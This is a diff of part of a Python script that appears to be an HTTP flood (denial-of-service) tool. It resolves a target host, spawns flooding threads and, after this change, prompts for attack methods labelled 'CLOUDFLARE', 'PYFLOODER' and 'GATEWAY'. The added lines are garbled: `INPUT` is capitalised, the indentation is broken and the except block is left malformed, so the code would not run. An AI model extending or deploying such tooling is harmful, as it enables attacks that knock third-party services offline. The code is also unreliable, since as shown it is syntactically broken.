@@ -112,7 +112,11 @@ try:
     host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
     ip = socket.gethostbyname(host)
 except socket.gaierror:
-    exit()
+    
+METHODS_LOADER= INPUT(F"{Fore.LIGHTBLUE_EX}HTTP_METHODS (EXAMPLE=GATEWAY)>")
+    
+    print(f"{Fore.CYAN}CUSTOM HTTP METHODS> SERVER CLOUDFLARE PYFLOODER GATEWAY")
+exit()
 for loader_num in range(create_thread):
     sys.stdout.write(f"\r {Fore.YELLOW}{loader_num} CREATE THREAD . . .{Fore.RESET}")
     sys.stdout.flush()
